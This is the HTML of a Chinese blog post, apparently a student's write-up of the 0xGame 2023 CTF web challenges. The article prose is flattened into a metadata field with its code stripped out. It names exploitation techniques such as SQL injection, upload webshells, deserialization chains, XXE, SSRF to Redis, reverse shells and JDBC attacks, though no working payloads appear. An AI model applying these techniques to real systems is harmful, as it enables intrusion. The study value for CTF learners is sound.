<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>0xGame 2023 | hybcx</title><meta name="keywords" content="CTF赛事"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="0xGame 2023"><meta name="application-name" content="0xGame 2023"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="0xGame 2023"><meta property="og:url" content="http://hybcx.xyz/2023/10/22/0xgame-2023/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 前言 新生赛真的多，前两周做的时候还心情舒畅，第三周就开始坐牢了，┭┮﹏┭┮，太菜了，新生赛也打不过。俗话说得好：打不过我还不会抄吗（狗头），我直接照着wp开卷！！！ 不过这个0xgame的比赛我只能说，体验感有点差，真心觉得不如动态靶机舒服（而且题目还难！！！） [Week 1] sig"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 前言 新生赛真的多，前两周做的时候还心情舒畅，第三周就开始坐牢了，┭┮﹏┭┮，太菜了，新生赛也打不过。俗话说得好：打不过我还不会抄吗（狗头），我直接照着wp开卷！！！ 不过这个0xgame的比赛我只能说，体验感有点差，真心觉得不如动态靶机舒服（而且题目还难！！！） [Week 1] sig"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/10/22/0xgame-2023/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: '0xGame 2023',
  postAI: '',
  pageFillDescription: '0x01 前言, [Week 1] signin, [Week 1] baby_php, [Week 1] hello_http, [Week 1] repo_leak, [Week 1] ping, [Week 2] ez_sqli, [Week 2] ez_upload, [Week 2] ez_unserialize, [Week 2] ez_sandbox, [Week 3] notebook, [Week 3] rss_parser, [Week 3] zip_file_manager, 方法一：, 方法二：, [Week 3] web_snapshot, [Week 3] GoShop, [Week 4] spring, env 泄露配置信息, mappings 泄露路由信息, heapdump 泄露堆栈信息, [Week 4] auth_bypass, [Week 4] YourBatis, [Week 4] TestConnection, 0x02 后记, 0x03 参考文章前言新生赛真的多前两周做的时候还心情舒畅第三周就开始坐牢了太菜了新生赛也打不过俗话说得好打不过我还不会抄吗狗头我直接照着开卷不过这个的比赛我只能说体验感有点差真心觉得不如动态靶机舒服而且题目还难首先打开之后是一个简单的页面这里页面还说你能找到吗呵呵我当然找不到了这里呢我尝试抓包以及扫目录均无果当时就焦虑了我想着第一周的新手题就不会了之后一下想到打开抓个包看看是否有信息嗨想不到真有开启控制台随后重新刷新一下页面抓包这里发现有页面的文件源码这时我就认为大概率就是此处了哈哈一番搜索发现果然在此文件下简单的特性这里首先要求传入的参数不相等但加密后的值要相等我们直接数组绕过即可其次在接着判断参数是否是数字只有满足不是数字且不等于且经过取整后等于即可包含文件那首先是绕过函数函数对于空字符无论是放在前后都可以判断为非数值而空格字符只能放在数值后根据上述我们可以实现绕过不过这里直接在后面其他字符如也可以其次是这里可以看到有取整函数那我们应该想到将赋值为浮点类型这样就可以成功绕过并且也会截断非数字的部分最终如下至于为何这里要用伪协议读取我猜测是如果直接赋值为的话会执行文件中的代码导致最终结果不可见故此选择伪协议读取将文件内容进行编码导致其不可执行最终回显出来如上图直接解码即可这里考察基础知识根据页面信息我们选择传参为接着让我们传参为又提示我们不是这里还是直接上吧发现敏感词我们将其修改为此时又提示我们不是内网那我们用头修改一下看看这时提示我们头不是指定的那我们直接修改即可最后又提示我们头来源不正确那我们继续修改拿到如上图我们看一下题目名称就可以猜到应该是信息泄露此时扫一下看看如图发现很多关于泄露的东西这里直接上工具去利用漏洞使用等工具下载站点存储库的整个代码历史记录和配置信息下载地址如上注意是环境具体用法参考泄露总结用法如下在工具所在目录打开随后进入目标所在目录首先查看一下日志可以看到哪一个人在哪个时间提交了那一个文件每一个都会生成一个哈希值这个值是唯一的相当于的身份证这里可以看到在第二次提交的时候看到其提交了那我们查看一下可以查看近期所有的提交记录这样就可以回滚到任意一个版本接下来查看所在的可以进一步查看提交的文件内容找到打开是一个命令执行页面我们先查看一下源码看看有什么信息果然这里提示我们访问一下结果发现这里是前面页面的源码这里可以看到过滤了分号空格斜杠以及关键词不过这里对我们传入的执行了正则的过滤这里过滤的很全似乎是只允许数字的这里我们尝试换行绕过先搞一个对上述正则的解释整个正则表达式用于匹配地址的所有四个部分确保每个部分的值在到之间且用点号分隔这是一个有效的地址验证正则表达式如上图看到成功执行那现在就是考虑如果绕过过滤读取到了这里肯定就要用到编码之类的空格过滤的话我们可以用或者等等至于分号的过滤大概率是避免我们的变量拼接吧这里网站文章翻翻发现编码就可以绕过注意上述的之前的空格符用代替即可绕过拿到随后在下载题目给的附件是一串源码这里呢设置了黑名单过滤了很多敏感词之后如果访问路由的话或自动执行函数随后检查参数的和遍历黑名单数组查看是否存在敏感字词接着查看传入的是否是中的一个如果不是则默认配置为之后执行语句根据内容查找回显内容这里分析完之后我依旧没什么思路太菜了这里也是看了发现可以堆叠注入他说是敏感函数可以执行多条语句事后诸葛亮的我悟了看来日后分析代码时也要搜寻相关函数的用法来找漏洞既然提示我们是堆叠注入且其中黑名单过滤的很多以及去掉了空白字符也就是过滤空格因此这里我又没思路了只能看了发现其利用的是预处理知识但我还没仔细学过因此这里我直接大概了解一下上个之后认真学习一番最近事情好多真累啊讲的考察堆叠注预处理语句绕过名单过滤了常的关键词正常没办法进注也跑不出来先得知道的持执多条语句这个也给了然后持语句的预处理这个上搜搜也能找到对应的章和预处理语句如下这里我们用报错注入去搞但报错注入回显内容有限这里由于黑名单的存在因此将其进行了码进制编码绕过大概原理是一条待执行语句随后将其置入预处理中接着执行也没仔细学说错了别打找到打开题目是一个文件上传题我们下载附件可以看到对应源码那直接分析一波这里存储着一个文件上传目录地址如果目录不存在则创建文件目录检查文件上传类型对应的由相应函数创建一个新图像获取上传文件的拓展名接着在搞一个新文件路径由原文件的值和拓展名构成接着在以为文件名创建一个新图像这里就可以感觉出是二次渲染了这里当初分析代码的时候也没发现竟然是一道二次渲染题果然还是太菜了代码审计功底也垃圾这里对二次渲染用的不多因此只得啃了题的功能其实是个简单的次渲染次渲染就是指服务端对户上传的图进了次处理例如图的裁切添加印等等如果只是在图的末尾简单的添加了代码并上传那么经过次渲染之后的图是不会包含这段代码的因此需要去找些绕过库次渲染的脚本然后再构造图看了几篇文章感觉二次渲染就是一个在你上传一个图片之后服务器会去提取一个图片基本组成要素也就是你上传的之后在次组合成一个新图像去自己新建一个图片名字去上传保存这里解释的也有点垃圾后续写完将其中的知识点好好学学这里先复现一波图片的上传吧原理不细说了参考文章如下这里有两种方法这里我也就直接尝试其中一个简单的了因为懒直接上国外大牛的脚本一键生成他这里是向写入数据块之后我们可以在环境下运行上述代码或者直接运行也可将生成的直接上传不过这里代码并没有限制后缀的文件我们在页面上传后直接修改后缀为即可如图将改为上传之后访问链接执行恶意代码即可拿到依旧是浏览敏感函数这里可以发现就是我们最终要利用的地方那我们思考如何调用魔术方法在对象中调用一个不可访问方法时调用依据上述我们可以找到敏感语句倘若我们将赋值为对象而其中也没有方法那我们便成功调用接下来在判断如何调用其所在的方法我们接着浏览可以看到这意味着如果我们将变量赋值为对象我们便可以成功调用那接下来在判断如何调用其所在的魔术方法在给不可访问属性赋值时调用依据上述我们可以找到这意味着如果我们将赋值为对象时接着将变量赋值为对象中没有的属性那我们便可以成功调用综上所述我们链如下接下来就是变量赋值问题了这里我也是有点手足无措只好借助了如下这里在总结一波思路首先两个对象接着一个对象用于后续调用方法接着给其中的赋值为对象随后在将中的属性与的属性做一个引用然后是将属性赋值为含有两个元素的数组这里呢先看的第一个元素也就是其在循环的第一次赋值时调用了魔术方法这时候其中的属性被赋值为空数组接着由于的属性为这时候是无法成功调用方法的于是数组此时被赋值为总之此时便不在是空了但此时我们注意由于引用的存在此时的属性已经不可能为了紧接着在第二次循环时便可以成功调用的方法接着我们将赋值为对象由于其中不存在方法于是我们成功调用了其中的魔术方法并且字符串与被当做的参数此时我们又可以将其中的赋值为一个数组其中的为我们想要执行的恶意代码即可这样在上述的组合下变为恶意代码恶意代码输出如上这里也是看别人知道被放在了环境变量中这里它采用读取的方法但令我疑惑的是为何直接赋值为的话执行不了拿到打开题目发现一个登录框弱口令无果扔给扫目录随后用抓一个登录包数据看看有何信息如上图是一个数据块其中包含用户名和密码其次扫目录发现存在注册用户页面看题目名称为沙箱也没思路于是看发现考察沙箱逃逸和原型链污染懵逼了这玩意儿没咋好好学只能浑水摸鱼了写完后就学代码在注册和登录的时候使了根据些参考章很容易就可以知道这存在原型链污染但是关键词被过滤了如果你对原型链这个概念稍微做点深了解就可以知道对于个实例对象它的就等于这样可以绕过关键词的过滤先注册个用户在登录时如下内容污染对象使得表达式的结果为随后登录进去发现成功得到用户权限然后是个简单的沙箱逃逸代码会沙箱执时抛出的异常并访问异常的属性那么结合上面的文章可以通过抛出对象的思路拿到指向当前函数的调用者然后拿到沙箱外的对象最终实现函数有些简单的关键词过滤不过因为语言本身非常灵活所以可以使用中括号字符串拼接的形式绕过下面两种方式都行对象于创建对某对象的代理以实现属性和法的拦截访问这个对象的任意个属性都会执指向的函数针对该对象的属性定义个当访问时会调对应的函数拿到等我深入学习一波再回来思考打开题目是一个笔记本这里测试了一番发现不是等漏洞搜目录也没有信息根据题目提示说是该项目由框架搭建之后看了发现考察的是伪构造反序列化反弹题目源码如下这里由于没学过相关知识我还是跟着走一遍吧后续再去补这里分析一遍代码会发现存在这里就是让我们利用其去伪造先得知道的信息存储在中因此这种也被称作客户端要想保证不被恶意修改就会使个进签名注意签名不等于加密我们其实仍然能够看到中存储的信息但是法修改它这点和类似题目中的这留了个随机数主要是让家关注随机数的长度如果这个长度过小那么很容易就能爆破出来部分人可能不知道它长度是多少这个其实放到里面运行下就知道了只有位然后因为是所以只会出现这些字符如图所示可以看到位数是位接下来先手动生成个四位数字典利用伪造工具将上述脚本生成的复制到工具的目录下随后输入如下命令这里的的获取是如下图所示的页面下的如图成功爆破然后就是利用路由下的反序列化这里用的是反弹如下然后就是伪造注意值要为对应值这里由于周围被双引号包围故我们里面的只能都用单引号起冲突的我们要用转义如图成功加密我们刷新页面抓包替换上述发送即可同时我们的要开启监听注意端口要在安全组放开成功反弹拿到这道题看不懂先跟着复现完最后学相关知识吧这里题目给了源码这里看到关键词就是猜测就是漏洞了翻了翻笔记上述代码是经典的防止解析外部的防御代码与题目给的代码进行比较我们可以很容易的发现题目是存在漏洞的将一个符合标准的放到服务器上就可以也可以参考改一改这里我感觉参考也是可以改改的但是无法直接读取文件这里考察获取在模式下的以实现读取至于为何是上述这种格式这就得参考代码处的也就是说我们的中必须含有在看如下这意味着我们还要有如图成功读取转换为十进制然后读取或者因为这里不存在所以读取结果为然后根据上面的文章读取显示也就是没有值所以不用拼接直接用上面的就行剩下的可以通过读取来猜一下一般都是或者最底下的用户多试几个就行最后随便填一个比如就能在报错页面看到的路径注意新版本计算时用的是旧版本才是运行得到码之后在靶机首页随便输入一个错误的地址进入报错页面之后在右侧点击一个小黑框输入之后可以在左侧看到一个可以执行代码的地方如下图输入即可得到根据题目给出的源码我们分析发现此处进行了命令执行凭借我浅薄的记忆我认出了这里是类似的相关漏洞可以用软链接进行的函数中主要就是创建一个文件上传后的目录其中还过滤了也就是防止目录穿越最后还提取相关关键词等等来渲染前端页面函数中主要就是对我们上传的文件进行解压并覆盖原有文件将解压得到的文件上传至所指的目录下方法一众所周知存在软链接这一功能而支持压缩软链接程序又是用命令进行解压缩因此会存在这个漏洞相比之下如果使用的库进行解压缩就不会存在这个问题软链接用法我认为可以参考命令之软连接详解这里使用命令的原因压缩保持软连接使用参数可以使能够保留软链接那我们在下操作一番随后找到并上传至靶机如上图点击即可下载得到方法二调用执行命令但是路径是直接拼接过去的而的文件名又可控这里存在一个很明显的命令注入上传时抓包把改成下面的命令即可发送如下图成功反弹拿到接下来我又很疑惑为何这里恶意命令前后需要两个后缀如上图我自己分析了一波感觉是肯定是必有的因为代码会检测的后缀是否含有而的保留我认为是为了令命令的正常使用如果没有那就是那这里就不存在要解压的文件了但如果有的话就是很明显是解压的可以正常使用我也不知道分析的对不对希望日后可以有缘看到合理的解释这道题知识点是打主从复制没学过因此先跟着复现题目会通过函数请求网页并将源码保存在数据库中请求网页的过程很明显存在但是限制输入的只能以开头首先注意设置的参数代表允许根据返回头中的进行重定向参考而支持等协议那么我们就可以通过头把协议从重定向至这个技巧在一些关于的文章里面也会提到结合的知识点可以尝试主从复制工具这里将和分为两个文件同时在上启动一个服务器例如然后将上述两个文件上传至该服务的根目录下最后在题目当中去访问这两个文件显示如图所示的状态同时记得开启的监听如图所示在访问之后会看到如图所示的状态代表成功打入记得端口要开放之后在访问之后会显示上图所示的我们访问即可看到环境变量中的这里得注意几个点首先得分两次打不然你在执行命令之后又立即执行了这就导致根本没有时间去主从复制其次在使用发送命令的时候记得结尾加上不然会一直卡住然后注意的主机名是而不是因此访问数据库得用如果用协议打的话得调整一下顺序因为每次执行命令之间会存在一定的时间间隔所以得先设置和然后再不然最终同步的文件名和路径还是原来的题目是一个商店初始为需要购买金额为的商品后才能拿到这题就是审计代码不过我也没学过语言不过我看了一番猜测问题可能会出现在如下位置这里是判断用户购买金额以及数量的地方接下来就看了程序使用了将传递的字符串转换成了类型的变量后面判断用户的时将其转换成了类型而本身也是类型这里先介绍一些概念语言是强类型语言包含多种数据类型以数字类型为例存在无符号整型和有符号整型等类型语言在编译期会检查源码中定义的变量是否存在溢出例如会使得编译不通过但是并不会检查变量的运算过程中是否存在溢出例如如果程序没有对变量的取值范围做限制那么在部分场景下就可能存在整数溢出漏洞上面的虽然限制了不能为负数但是并没有限制的最大值因此我们可以控制使得溢出为一个负数之后进行运算的时候当前用户的就会增加最终达到一个可以购买商品的金额从而拿到查阅相关文档可以知道类型的范围是经过简单的计算或者瞎猜可以购买数量为的点击成功拿到看看再看看根据题目提示这里会有信息泄露于是我上网搜查了一下相关信息结合提示我们来看一下有哪些敏感信息首先访问泄露配置信息这里看到了用户名和密码不过密码不可见不过这里的用户名提示我们就在所以我们思路就是想办法得到密码的明文泄露路由信息访问之后可以看到存在诸多路由信息我们可以有选择的去读取泄露堆栈信息这个在架构中是可用的会泄露出推栈信息其中是可以窃取到一些关键的信息比如一些关键的或者数据库连接密码但是扫描工具没把它列为扫描端点看了一下文章其中说是要利用一些工具的地址如下这里直接下载包同时确保本地有与以上的环境直接按如下命令运行即可注意将所要获取的信息文件放入至于同一目录下如上图成功得到或者用其它工具比如也行用的话查询语句如下绕过网上有类似的文章也可以自己尝试一些畸形路径题目通过包部署预期需要尝试通过任意文件下载获取更多信息利用目录你可能会用到的网站看了一眼题目给的附件源码如下这里主要是限制了与防止用户的目录穿越以及限制路由的访问接下来看一下另一个文件靠着分析了一波这段代码的作用就是获取到服务器上文件的真实路径以及文件名以供后续的文件下载功能的使用下载题目提示我们绕过那我们去看看怎么个事儿这里绕过方式很多种参考如下文章安全之权限绕过如图这里我将进行编码后这里页面显示成功访问了不过这里还可以多绕过如下图这里尝试直接读取但依旧是无权访问接下来也就没思路了看然后可以通过下载文件但是无法读取提示那么很明显需要根据题目描述网站使用打包这个其实也就相当于压缩包在部署的时候会将其解压而压缩包内会存在一个目录目录里面包含编译好的文件以及保存路由和类的映射关系这里浅浅了解一下目录是的应用的安全目录如果想在页面中直接访问其中的文件必须通过文件对要访问的文件进行相应映射才能访问主要包含一下文件或目录应用程序配置文件描述了和其他的应用组件配置及命名规则含了站点所有用的文件包括和非他们不能包含在文件中存放应用需要的各种文件放置仅在这个应用中要求使用的文件如数据库驱动文件源码目录按照包名结构放置各个文件数据库配置文件如图进行访问下载得到文件这里的内部构造看不太懂所以靠了存在映射的路由为根据网上文章的知识点通过包名构造对应的文件路径并下载下载之后我选择了打开文件这里上述代码提示我们是处理的请求直接访问传个参就能执行命令最后因为没有回显需要反弹或者通过外带这里我直接进行执行了如下图但我不理解的是为何就能读取不过官方采用的方式有以下几个注意点这里首先得注意传入的命令需要进行一次编码具体原因大家可以参考下面两篇文章然后传递命令时得先一次关注题目名称描述以及中的依赖注入不是考点题目需要尝试结合网上的文章构造注意反编译包的时候请不要使用尝试使用或你可能会用到的网站在进行的时候因为的解析问题所以最终传入的命令内不得包含和可以尝试编码绕过这里让我们关注题目名称这里我直接搜索了漏洞发现有很多相关复现文章在此之前我们先打开包之后将其中的文件用打开这里让我们关注一下通过这个文件可以查看包使用的第三方库这里我感觉重点就是版本为于是胡乱搜了一通发现下面的信息那这里估计就是跟着现有的漏洞去复现了加上题目提示我们存在注入以及我们关键词一搜一大把重点就是找到正确合理的文章了从注入到注入从一道题浅谈与的那些事这里显示了查询的语句重点在最后一个方法这里估计就是漏洞注入点了看了看文章感觉格式应该是这样但不了解的的代码只能看了但是很显然是会失败的因为传入的命令包含了和会被递归解析为另一个表达式的开头和结尾这个点可能比较难所以后面给出了解决方案是只要不出现大括号就行方法很多这里给出一种利用调用自身的方法这里要将进行编码如上图拿到会不会存在一些漏洞你可能会用到的网站这里似乎考的就是了下面跟着复现就是用于操作数据库的接口通过一个统一规范的接口可以实现同一段代码兼容不同类型数据库的访问就是用于连接数据库的字符串格式为就是数据库类型例如是要使用的数据库名是要传入的参数比如指定连接时使用的编码类型等等当可控时如果目标网站使用了旧版的数据库驱动在特定情况下就可以实现参考文章在中看到两个依赖与给了两个依赖和对应两种利用方式然后还有依赖这个主要是方便大家在后面用工具去生成反序列化首先是驱动的利用结合网上文章可以构造对应的首先得注意因为题目给的代码是即会单独传入一个参数因此中的会被后面的给覆盖网上的部分利用工具会通过来区分不同的所以得注意要单独传不然写在里面就被覆盖了其次因为本身也符合的规范所以在传参数的时候需要把本身全部进行编码防止服务器错把这些参数当成是一个参数而不是里面的参数最后依然是命令编码的问题一些利用工具编码这里尝试了老多次了我感觉就是需要有一个公网来开启服务如下图随后发包去发送恶意命令进行如上图证明发送成功最后在中可以看到后记终于复现完了虽然感觉做题体验感不好但出的题真的有水平啊因为全不会新生赛就这么高强度总的来说很多知识点都没见过就这四周的知识点就够我学一阵儿了同时我依旧困惑于如何去学习提高代码水平感觉目前的自己就是不会脚本不会审计代码也很有难度真的全是感觉似乎要认真地重新学学代码了参考文章官方函数的绕过常见函数绕过与弱等于绕过常见的源码泄漏漏洞之配置不当的漏洞利用漏洞利用未授权的测试与利用思路安全之',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2023-11-05 16:54:48',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 